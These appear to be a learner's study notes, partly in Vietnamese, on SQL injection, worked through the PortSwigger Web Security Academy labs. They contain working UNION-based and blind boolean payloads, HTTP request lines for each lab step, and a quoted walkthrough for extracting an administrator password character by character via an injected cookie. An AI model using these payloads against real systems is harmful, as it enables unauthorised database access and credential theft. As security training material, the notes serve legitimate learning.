-What is SQL injection (SQLi)?
  +The single quote character ' and look for errors or other anomalies.
  +Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
  +Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
  +Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
  +OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

-SQL injection in different parts of the query
  +Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query.
  +In UPDATE statements, within the updated values or the WHERE clause.
  +In INSERT statements, within the inserted values.
  +In SELECT statements, within the table or column name.
  +In SELECT statements, within the ORDER BY clause.

-Retrieving hidden data

-SQL injection UNION attacks
  + you can use the UNION keyword to retrieve data from other tables within the database.
  For a UNION query to work, two key requirements must be met:
    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.
+How many columns are being returned from the original query.
+Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

-Determining the number of columns required
  +' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
  +The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.
  +' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
-LAB: category='UNION+SELECT+NULL,NULL,NULL-- => HTTP 200 REP => 3 COLUMN;

-Database-specific syntax
https://portswigger.net/web-security/sql-injection/cheat-sheet

-Finding columns with a useful data type
  +ex:' UNION SELECT 'a',NULL,NULL,NULL--
  +ex:' UNION SELECT NULL,'a',NULL,NULL--
  +ex:' UNION SELECT NULL,NULL,'a',NULL--
  +ex:' UNION SELECT NULL,NULL,NULL,'a'--

-Lab: SQL injection UNION attack, finding a column containing text
STEP 1: category=%27UNION+SELECT+NULL,NULL,NULL--
STEP 2:category=%27UNION+SELECT+NULL,%27brnCRr%27,NULL--
STEP: HERE WE GOT HEHEHE.

-Using a SQL injection UNION attack to retrieve interesting data
  +ex:In this example, you can retrieve the contents of the users table by submitting the input:
  ' UNION SELECT username, password FROM users--
  +lab:be easy

-Retrieving multiple values within a single column
  +on Oracle you could submit the input:
' UNION SELECT username || '~' || password FROM users--
  +...
  administrator~s3cure
  wiener~peter
  carlos~montoya
  ...
+lab:category='UNION+SELECT+1,username||'~'||password+FROM+users--

-Examining the database in SQL injection attacks
  +The type and version of the database software.
  +The tables and columns that the database contains.
-Querying the database type and version
  Database type	Query
  Microsoft, MySQL	SELECT @@version
  Oracle	          SELECT * FROM v$version
  PostgreSQL	      SELECT version()
  For example, you could use a UNION attack with the following input:
    +ex:' UNION SELECT @@version--
    Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
    Mar 18 2018 09:11:49
    Copyright (c) Microsoft Corporation
    Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
   GET /filter?category='+UNION+SELECT+version(),'123'# HTTP/2

-Listing the contents of the database
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
  +ex:SELECT * FROM information_schema.tables //Liệt kê các bảng
  +ex:SELECT * FROM information_schema.columns WHERE table_name = 'Users' //liệt kê các cột trong bảng
  +
Lab: SQL injection attack, listing the database contents on non-Oracle databases
step 1: check union injection => null,null;
step 2:GET /filter?category='UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2 => show all the tables name
step 3: scroll the pretty code => find users_tntqft
step 4:GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_tntqft'-- HTTP/2 => contain password_khkmee and username_hjhyfp
final: GET /filter?category='+UNION+SELECT+password_khkmee+,username_hjhyfp+FROM+users_tntqft-- HTTP/2 => get administrator and password of it


-Blind SQL injection
-What is blind SQL injection?
+Không có thông tin trả về từ http rep => tự suy luận lỗi dựa trên các kết quả
  +Boolean-based Blind SQLi: Ứng dụng trả kết quả khác nhau (ví dụ: khác nội dung, khác độ dài trang) tùy vào mệnh đề SQL đúng/sai.
  +Time-based Blind SQLi: Ứng dụng phản hồi chậm lại (delay) nếu một điều kiện trong SQL đúng.
=>UNION attack không hiệu quả

-Exploiting blind SQL injection by triggering conditional responses
+…xyz' AND '1'='1
…xyz' AND '1'='2
=> chèn điều kiện đúng kết quả có thể nhận là "welcome back" hay tương tự như vậy, còn với điều kiện sai thì nó sẽ không trả gì => khai thác băng việc gởi từng bit điều kiện để kiểm tra db

+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm    => 't => = 's
điều này có nghĩa, nếu rep là welcome back => điều kiện đúng => kí tự đầu tiên trong mật khẩu lớn hơn m trong bảng ascii ==> tiếp tục chẻ đôi tại t và cuối cùng xác nhận nó là s
+tượng tự nếu rep sai => nó sẽ nhỏ hơn => cứ dùng binary search để chẻ đôi thì sẽ khá nhanh

+lab: Cookie: TrackingId=Vt1SCZoS78pO83Ry' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'l; session=7CSLlrxoWHIxdFWNAiLAtavTWoHQ1RBM
=>7mni43cl8qrj8t7h0ydu dò từng cái ra pass này
Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
Modify the TrackingId cookie, changing it to:

TrackingId=xyz' AND '1'='1
Verify that the Welcome back message appears in the response.

Now change it to:

TrackingId=xyz' AND '1'='2
Verify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
Verify that the condition is true, confirming that there is a table called users.

Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Verify that the condition is true, confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
Then send:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.

After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
In Burp Intruder, change the value of the cookie to:

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add § button. You should then see the following as the cookie value (note the payload position markers):

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.
To be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the  Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
Launch the attack by clicking the  Start attack button.
Review the attack results to find the value of the character at the first position. You should see a column in the results called Welcome back. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
Launch the modified attack, review the results, and note the character at the second offset.
Continue this process testing offset 3, 4, and so on, until you have the whole password.
In the browser, click My account to open the login page. Use the password to log in as the administrator user.


